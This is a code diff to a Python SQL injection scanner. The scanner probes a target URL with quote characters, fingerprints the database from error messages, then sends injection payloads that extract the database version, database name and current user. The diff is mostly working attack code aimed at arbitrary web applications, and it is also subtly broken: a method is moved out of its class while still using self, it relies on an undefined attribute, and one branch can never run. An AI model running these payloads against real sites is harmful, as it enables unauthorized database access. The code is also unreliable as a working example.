@@ -15,6 +15,9 @@ class SQLInjectionScanner:
             "Advantage_Database": ['AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader', 'AdsDataReader', 'AdsError'],
             "Firebird": ['Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range', 'malformed string', 'Invalid token']
         }
+        self.db_type = None
+        self.db_name = None
+        self.current_user = None
 
     async def scan_database_type(self):
         urls = [self.database_type + "'", self.database_type + '"', self.database_type + ';', self.database_type + ")", self.database_type + "')", self.database_type + '")', self.database_type + '*', self.database_type + '";']
@@ -67,15 +70,14 @@ class SQLInjectionScanner:
             "SELECT @@GLOBAL.VERSION; --",
             "SELECT @@VERSION; --",
         ]:
-            post_data = {}
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with self.session.post(full_url, data=post_data) as response:
+                async with self.session.get(full_url) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
-                print(f"Error performing POST request for query '{query}': {e}")
+                print(f"Error performing GET request for query '{query}': {e}")
 
     async def perform_postgre_get_version(self):
         print("PostgreSQL: Retrieving Database version...")
@@ -84,15 +86,14 @@ class SQLInjectionScanner:
             "SELECT current_setting('server_version'); --",
             "SELECT setting FROM pg_settings WHERE name = 'server_version'; --",
         ]:
-            post_data = {}
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with self.session.post(full_url, data=post_data) as response:
+                async with self.session.get(full_url) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
-                print(f"Error performing POST request for query '{query}': {e}")
+                print(f"Error performing GET request for query '{query}': {e}")
 
     async def perform_microsoftsql_get_version(self):
         print("Microsoft SQL Server: Retrieving Database version...")
@@ -101,15 +102,14 @@ class SQLInjectionScanner:
             "SELECT SERVERPROPERTY('productversion'); --",
             "SELECT SERVERPROPERTY('productlevel'); --",
         ]:
-            post_data = {}
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with self.session.post(full_url, data=post_data) as response:
+                async with self.session.get(full_url) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
-                print(f"Error performing POST request for query '{query}': {e}")
+                print(f"Error performing GET request for query '{query}': {e}")
 
     async def perform_oracle_get_version(self):
         print("Oracle: Retrieving Database version...")
@@ -118,15 +118,14 @@ class SQLInjectionScanner:
             "SELECT * FROM v$version; --",
             "SELECT version FROM v$instance; --",
         ]:
-            post_data = {}
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with self.session.post(full_url, data=post_data) as response:
+                async with self.session.get(full_url) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
-                print(f"Error performing POST request for query '{query}': {e}")
+                print(f"Error performing GET request for query '{query}': {e}")
 
     async def perform_advantage_get_version(self):
         print("Advantage Database: Retrieving Database version...")
@@ -135,15 +134,14 @@ class SQLInjectionScanner:
             "SELECT AdsVersion(); --",
             "SELECT AdsExtendedReader('SELECT AdsVersion()', AdsConnection()); --",
         ]:
-            post_data = {}
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with self.session.post(full_url, data=post_data) as response:
+                async with self.session.get(full_url) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
-                print(f"Error performing POST request for query '{query}': {e}")
+                print(f"Error performing GET request for query '{query}': {e}")
 
     async def perform_firebird_get_version(self):
         print("Firebird: Retrieving Database version...")
@@ -152,16 +150,14 @@ class SQLInjectionScanner:
             "SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database; --",
             "SELECT rdb$get_context('SYSTEM', 'ODS_VERSION') FROM rdb$database; --",
         ]:
-            post_data = {}
             full_url = f'{self.target_url}+{query}'
 
             try:
-                async with self.session.post(full_url, data=post_data) as response:
+                async with self.session.get(full_url) as response:
                     result = await response.text()
                     print(result)
             except Exception as e:
-                print(f"Error performing POST request for query '{query}': {e}")
-
+                print(f"Error performing GET request for query '{query}': {e}")
 
     async def get_database_name(self):
         print(f"Getting database name for {self.database_type} database...")
@@ -291,23 +287,22 @@ class SQLInjectionScanner:
                 print(f"Error performing POST request for query '{query}': {e}")
 
     async def get_current_user(self):
-        print(f"Getting current user for {self.database_type} database...")
+        print(f"Getting current user for {self.db_type} database...")
 
-        if self.database_type == "MySQL":
+        if self.db_type == "MySQL":
             await self.perform_mysql_get_current_user()
-        elif self.database_type == "PostGre":
+        elif self.db_type == "PostGre":
             await self.perform_postgre_get_current_user()
-        elif self.database_type == "Microsoft_SQL":
+        elif self.db_type == "Microsoft_SQL":
             await self.perform_microsoftsql_get_current_user()
-        elif self.database_type == "Oracle":
+        elif self.db_type == "Oracle":
             await self.perform_oracle_get_current_user()
-        elif self.database_type == "Advantage_Database":
+        elif self.db_type == "Advantage_Database":
             await self.perform_advantage_get_current_user()
-        elif self.database_type == "Firebird":
+        elif self.db_type == "Firebird":
             await self.perform_firebird_get_current_user()
         else:
-            print(f"Unsupported database type: {self.database_type}")
-
+            print(f"Unsupported database type: {self.db_type}")
     async def perform_microsoftsql_get_current_user(self):
         print("Microsoft SQL Server: Retrieving current user...")
         async with aiohttp.ClientSession() as session:
@@ -480,78 +475,54 @@ class SQLInjectionScanner:
                 except Exception as e:
                     print(f"MySQL: Error performing POST request for query '{query}': {e}")
                     
-    async def get_dbname(target_url):
-        db_dict = {
-            "MySQL": [
-                'MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()',
-                '1064 You have an error in your SQL syntax'
-            ],
-            "PostGre": [
-                'PostgreSQL query failed', 'Query failed', 'syntax error', 'unterminated quoted string', 'unterminated dollar-quoted string',
-                'column not found', 'relation not found', 'function not found'
-            ],
-            "Microsoft_SQL": [
-                'Microsoft SQL Server', 'Invalid object name', 'Unclosed quotation mark', 'Incorrect syntax near', 'SQL Server error',
-                'The data types ntext and nvarchar are incompatible'
-            ],
-            "Oracle": [
-                'ORA-', 'Oracle error', 'PLS-', 'invalid identifier', 'missing expression', 'missing keyword', 'missing right parenthesis',
-                'not a valid month'
-            ],
-            "Advantage_Database": [
-                'AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader', 'AdsDataReader', 'AdsError'
-            ],
-            "Firebird": [
-                'Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range', 'malformed string',
-                'Invalid token'
-            ]
-        }
+async def get_dbname(self, db_type):
+    print(f"Getting database name for {db_type} database...")
 
-        async with aiohttp.ClientSession() as session:
-            for db_type, identifiers in db_dict.items():
-                for identifier in identifiers:
-                    url = f"{target_url} and extractvalue(1,concat(1,(select database()))) --{identifier}"
-                    try:
-                        async with session.get(url) as response:
-                            data = await response.text()
-                            if identifier in data:
-                                soup = BS(data, features='html.parser')
-                                db_name = soup.get_text().strip()
-                                print(f"Database name for {db_type}: {db_name}")
-                                return
-                    except aiohttp.ClientError as e:
-                        print(f"Error during database name extraction for {db_type}: {e}")
+    async with aiohttp.ClientSession() as session:
+        identifiers = self.db_dict.get(db_type, [])
 
-        print("Database name extraction failed for all database types.")
+        for identifier in identifiers:
+            url = f"{self.target_url} and extractvalue(1,concat(1,(select database()))) --{identifier}"
+            try:
+                async with session.get(url) as response:
+                    data = await response.text()
+                    if identifier in data:
+                        soup = BS(data, features='html.parser')
+                        db_name = soup.get_text().strip()
+                        print(f"Database name for {db_type}: {db_name}")
+                        return db_name
+            except aiohttp.ClientError as e:
+                print(f"Error during database name extraction for {db_type}: {e}")
+
+    print(f"Database name extraction failed for {db_type}.")
 
 
     async def close_session(self):
         await self.session.close()
 
+    async def run_scanner(self):
+        db_type = await self.scan_database_type()
+
+        if db_type:
+            self.db_type = db_type  # Set the class variable
+            self.db_name = await self.get_dbname(db_type)
+
+            if self.current_user:
+                await self.get_current_user()
+
+            if self.db_name:
+                await self.get_version()
+
+        else:
+            print(f"Could not find a vulnerability...")
+
 async def main():
     parser = argparse.ArgumentParser(description="SQL Injection Scanner")
-    parser.add_argument("-h", help="Target URL")
-    parser.add_argument("-gv", action="store_true", help="Retrieve database version")
-    parser.add_argument("-gcu", action="store_true", help="Retrieve current user")
-    parser.add_argument('-dbn', '--dbname', type=str, help='Get database name') 
+    parser.add_argument("-u", "--target_url", help="Target URL")
     args = parser.parse_args()
 
     scanner = SQLInjectionScanner(args.target_url, "")
-    db_type = await scanner.scan_database_type()
-
-    if db_type:
-        await scanner.get_database_name()
-
-        if args.get_current_user:
-            await scanner.get_current_user()
-
-        if args.get_version:
-            await scanner.get_version()
-
-    else:
-        print(f"Could not find a vulnerability...")
-
-    await scanner.close_session()
+    await scanner.run_scanner()
 
 if __name__ == "__main__":
     asyncio.run(main())
